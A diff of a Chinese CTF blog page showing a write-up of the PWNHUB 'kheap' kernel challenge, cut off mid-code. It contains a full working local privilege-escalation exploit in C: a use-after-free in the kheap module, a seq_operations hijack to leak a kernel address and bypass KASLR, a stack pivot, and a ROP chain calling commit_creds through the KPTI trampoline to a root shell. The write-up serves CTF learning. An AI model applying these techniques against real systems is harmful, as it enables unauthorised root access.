@@ -102,12 +102,12 @@ Arashimuのblog = CTFer</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeyvx1d4j20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclfw2t96j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipesx5fdwj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhfehz7j20zk0m8u0x.jpg"></li>
         </ul>
       </div>
     </header>
@@ -151,253 +151,78 @@ Arashimuのblog = CTFer</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h2 id="pwnhub-kheap"><a class="markdownIt-Anchor" href="#pwnhub-kheap"></a> PWNHUB-kheap</h2>
-<h3 id="保护与漏洞点"><a class="markdownIt-Anchor" href="#保护与漏洞点"></a> 保护与漏洞点</h3>
+    <h2 id="pwnhub-kheap"><a class="markdownIt-Anchor" href="#pwnhub-kheap">#</a> PWNHUB-kheap</h2>
+<h3 id="保护与漏洞点"><a class="markdownIt-Anchor" href="#保护与漏洞点">#</a> 保护与漏洞点</h3>
 <p>保护措施：kaslr、kpti、smep</p>
-<p>漏洞点在keap.ko中的keap_ioctl中，存在UAF漏洞</p>
-<img data-src="/images/linux-kernel-pwn4.jpg" style="zoom:80%;" />
-<p>对于ioctl，需要传入的参数是一个指向<code>info</code>结构体的指针</p>
-<img data-src="/images/linux-kernel-pwn7.jpg" style="zoom:80%;" />
-<p>创建的堆大小为<code>0x20</code>，这个大小攻击点感觉就是指向劫持<code>seq_operations</code>了</p>
-<img data-src="/images/linux-kernel-pwn26.jpg" style="zoom:80%;" />
-<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3>
-<p>先给出官方的exp</p>
-<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span>
-
-<span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span>
-
-<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span>
-&#123;</span>
-  <span class="hljs-type">uint64_t</span> idx;
-  <span class="hljs-type">char</span> *ptr;
-&#125;;
-
-<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">request</span>
-&#123;</span>
-  <span class="hljs-type">char</span> *ptr;
-  <span class="hljs-type">uint64_t</span> len;
-&#125;;
-
-
-<span class="hljs-type">int</span> dev_fd;
-<span class="hljs-type">uint64_t</span> user_cs,user_ss,user_eflag,user_rsp;
-
-<span class="hljs-type">void</span> <span class="hljs-title function_">save_state</span><span class="hljs-params">()</span>
-&#123;
-  <span class="hljs-keyword">asm</span>(
-    <span class="hljs-string">&quot;movq %%cs, %0;&quot;</span>
-    <span class="hljs-string">&quot;movq %%ss, %1;&quot;</span>
-    <span class="hljs-string">&quot;movq %%rsp, %3;&quot;</span>
-    <span class="hljs-string">&quot;pushfq;&quot;</span>
-    <span class="hljs-string">&quot;pop %2;&quot;</span>
-    : <span class="hljs-string">&quot;=r&quot;</span>(user_cs),<span class="hljs-string">&quot;=r&quot;</span>(user_ss),<span class="hljs-string">&quot;=r&quot;</span>(user_eflag),<span class="hljs-string">&quot;=r&quot;</span>(user_rsp)
-    :
-    : <span class="hljs-string">&quot;memory&quot;</span>
-  );
-&#125;
-
-<span class="hljs-type">void</span> <span class="hljs-title function_">new</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx)</span>
-&#123;
-  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">arg</span>=</span>&#123;idx,<span class="hljs-literal">NULL</span>&#125;;
-  ioctl(dev_fd,<span class="hljs-number">0x10000</span>,&amp;arg);
-&#125;
-
-<span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx)</span>
-&#123;
-  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">arg</span>=</span>&#123;idx,<span class="hljs-literal">NULL</span>&#125;;
-  ioctl(dev_fd,<span class="hljs-number">0x10001</span>,&amp;arg);
-&#125;
-
-<span class="hljs-type">void</span> <span class="hljs-title function_">choose</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx)</span>
-&#123;
-  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">arg</span>=</span>&#123;idx,<span class="hljs-literal">NULL</span>&#125;;
-  ioctl(dev_fd,<span class="hljs-number">0x10002</span>,&amp;arg);
-&#125;
-
-<span class="hljs-type">int</span> <span class="hljs-title function_">seq_open</span><span class="hljs-params">()</span>
-&#123;
-  <span class="hljs-type">int</span> seq;
-  <span class="hljs-keyword">if</span> ((seq=open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>,O_RDONLY))==<span class="hljs-number">-1</span>)
-  &#123;
-    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X] Seq Open Error&quot;</span>);
-    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
-  &#125;
-  <span class="hljs-keyword">return</span> seq;
-&#125;
-
-<span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>
-&#123;
-  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
-  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
-&#125;
-
-<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
-&#123;
-  save_state();
-  dev_fd=open(<span class="hljs-string">&quot;/dev/kheap&quot;</span>,O_RDWR);
-  <span class="hljs-keyword">if</span> (dev_fd&lt;<span class="hljs-number">0</span>)
-  &#123;
-    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X] Device Open Error&quot;</span>);
-    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
-  &#125;
-  
-
-  <span class="hljs-type">uint64_t</span> *buf=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>); 
-  <span class="hljs-type">uint64_t</span> *recv=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);
-  
-  new(<span class="hljs-number">0</span>);
-  choose(<span class="hljs-number">0</span>);
-  delete(<span class="hljs-number">0</span>);        <span class="hljs-comment">//释放了大小为0x20的堆heap</span>
-  
-  <span class="hljs-type">int</span> seq_fd=seq_open();  <span class="hljs-comment">//调用seq_open，会创建0x20大小的堆来保存seq_operations</span>
-  
-  read(dev_fd,(<span class="hljs-type">char</span> *)recv,<span class="hljs-number">0x20</span>);
-  
-  <span class="hljs-type">uint64_t</span> kernel_base=recv[<span class="hljs-number">0</span>]<span class="hljs-number">-0x33F980</span>;
-  <span class="hljs-type">uint64_t</span> prepare_kernel_cred=kernel_base+<span class="hljs-number">0xcebf0</span>;
-  <span class="hljs-type">uint64_t</span> commit_creds=kernel_base+<span class="hljs-number">0xce710</span>;
-  <span class="hljs-type">uint64_t</span> kpti_trampoline=kernel_base+<span class="hljs-number">0xc00fb0</span>;   <span class="hljs-comment">//会同时绕过kpti，然后执行swapg和retq</span>
-  <span class="hljs-type">uint64_t</span> seq_read=kernel_base+<span class="hljs-number">0x340560</span>;
-  <span class="hljs-type">uint64_t</span> pop_rdi=kernel_base+<span class="hljs-number">0x2517a</span>;
-  <span class="hljs-type">uint64_t</span> mov_rdi_rax=kernel_base+<span class="hljs-number">0x5982f4</span>;
-  <span class="hljs-type">uint64_t</span> gadget=kernel_base+<span class="hljs-number">0x94a10</span>;  <span class="hljs-comment">//0xffffffff81094a10 : xchg esp, eax ; ret</span>
-  
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel_base: 0x%lx\n&quot;</span>,kernel_base);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] prepare_kernel_cred: 0x%lx\n&quot;</span>,prepare_kernel_cred);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] commit_creds: 0x%lx\n&quot;</span>,commit_creds);
-  
-  <span class="hljs-comment">//gadget&amp;0xFFFFF000=&gt;地址对齐</span>
-  <span class="hljs-type">uint64_t</span> *mmap_addr=mmap((<span class="hljs-type">void</span> *)(gadget&amp;<span class="hljs-number">0xFFFFF000</span>),PAGE_SIZE,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_SHARED,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] mmap_addr: 0x%lx\n&quot;</span>,(<span class="hljs-type">uint64_t</span>)mmap_addr);
-  
-  <span class="hljs-comment">//((char *)mmap_addr)+0xa10 =&gt; 得到gadget地址的低4字节</span>
-  <span class="hljs-type">uint64_t</span> *ROP=(<span class="hljs-type">uint64_t</span> *)(((<span class="hljs-type">char</span> *)mmap_addr)+<span class="hljs-number">0xa10</span>),i=<span class="hljs-number">0</span>;
-  *(ROP+i++)=pop_rdi;
-  *(ROP+i++)=<span class="hljs-number">0</span>;
-  *(ROP+i++)=prepare_kernel_cred;
-  *(ROP+i++)=commit_creds;
-  *(ROP+i++)=kpti_trampoline+<span class="hljs-number">22</span>;   
-  *(ROP+i++)=<span class="hljs-number">0</span>;
-  *(ROP+i++)=<span class="hljs-number">0</span>;
-  *(ROP+i++)=(<span class="hljs-type">uint64_t</span>)get_shell;
-  *(ROP+i++)=user_cs;
-  *(ROP+i++)=user_eflag;
-  *(ROP+i++)=user_rsp;
-  *(ROP+i++)=user_ss;
-  
-  <span class="hljs-built_in">memcpy</span>(buf,recv,<span class="hljs-number">0x20</span>); 
-  buf[<span class="hljs-number">0</span>]=(<span class="hljs-type">uint64_t</span>)gadget;        <span class="hljs-comment">//劫持seq_ops的.start函数指针</span>
-  write(dev_fd,(<span class="hljs-type">char</span> *)buf,<span class="hljs-number">0x20</span>); <span class="hljs-comment">//把一开始泄露的地址重新写回select</span>
-  read(seq_fd,<span class="hljs-literal">NULL</span>,<span class="hljs-number">1</span>);
-
-&#125;
-<span class="hljs-comment">/*
-0xffffffff81000000
-0xffffa09b42945120
-0x33F980
-
-0xffffffff8112a6de : xchg eax, esp ; ret
-0xffffffff81094a10 : xchg esp, eax ; ret
-利用 xchg eax, esp 这个位于内核的 gadget，将栈转移到用户态低 32 位地址相同的地方。这个时候，我们只需要提前在这个位置布置上我们的 gadgets，就能达到提权的效果。
-注意：xchg eax, esp将清空两个寄存器的高位部分。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。
-
-file ./vmlinux
-add-symbol-file ./vmlinux 0xffffffff81000000
-add-symbol-file ./kheap.ko  0xffffffffc0002000
-target remote 0.0.0.0:1234
-*/</span>
-</code></pre>
-<h4 id="绕过kaslr保护"><a class="markdownIt-Anchor" href="#绕过kaslr保护"></a> 绕过kaslr保护</h4>
+<p>漏洞点在 keap.ko 中的 keap_ioctl 中，存在 UAF 漏洞</p>
+<p><img data-src="/images/linux-kernel-pwn4.jpg" alt=""></p>
+<p>对于 ioctl，需要传入的参数是一个指向 <code>info</code>  结构体的指针</p>
+<p><img data-src="/images/linux-kernel-pwn7.jpg" alt=""></p>
+<p>创建的堆大小为 <code>0x20</code> ，这个大小攻击点感觉就是指向劫持 <code>seq_operations</code>  了</p>
+<p><img data-src="/images/linux-kernel-pwn26.jpg" alt=""></p>
+<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h3>
+<p>先给出官方的 exp</p>
+<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;syscall.h></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/userfaultfd.h></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/msg.h></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ipc.h></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAGE_SIZE</span> <span class="token expression"><span class="token number">0x1000</span></span></span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">struct</span> <span class="token class-name">info</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token class-name">uint64_t</span> idx<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">struct</span> <span class="token class-name">request</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token class-name">uint64_t</span> len<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">int</span> dev_fd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token class-name">uint64_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_eflag<span class="token punctuation">,</span>user_rsp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">void</span> <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>  <span class="token keyword">asm</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token string">"movq %%cs, %0;"</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token string">"movq %%ss, %1;"</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token string">"movq %%rsp, %3;"</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token string">"pushfq;"</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token string">"pop %2;"</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_eflag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token operator">:</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token operator">:</span> <span class="token string">"memory"</span></pre></td></tr><tr><td data-num="53"></td><td><pre>  <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token keyword">void</span> <span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> idx<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>  <span class="token keyword">struct</span> <span class="token class-name">info</span> arg<span class="token operator">=</span><span class="token punctuation">&#123;</span>idx<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>  <span class="token function">ioctl</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span><span class="token number">0x10000</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> idx<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>  <span class="token keyword">struct</span> <span class="token class-name">info</span> arg<span class="token operator">=</span><span class="token punctuation">&#123;</span>idx<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>  <span class="token function">ioctl</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span><span class="token number">0x10001</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token keyword">void</span> <span class="token function">choose</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> idx<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>  <span class="token keyword">struct</span> <span class="token class-name">info</span> arg<span class="token operator">=</span><span class="token punctuation">&#123;</span>idx<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>  <span class="token function">ioctl</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span><span class="token number">0x10002</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token keyword">int</span> <span class="token function">seq_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>  <span class="token keyword">int</span> seq<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>seq<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[X] Seq Open Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>  <span class="token keyword">return</span> seq<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="84"></td><td><pre></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token keyword">void</span> <span class="token function">get_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="90"></td><td><pre></pre></td></tr><tr><td data-num="91"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>  <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>  dev_fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kheap"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="95"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dev_fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[X] Device Open Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="99"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="100"></td><td><pre>  </pre></td></tr><tr><td data-num="101"></td><td><pre></pre></td></tr><tr><td data-num="102"></td><td><pre>  <span class="token class-name">uint64_t</span> <span class="token operator">*</span>buf<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td 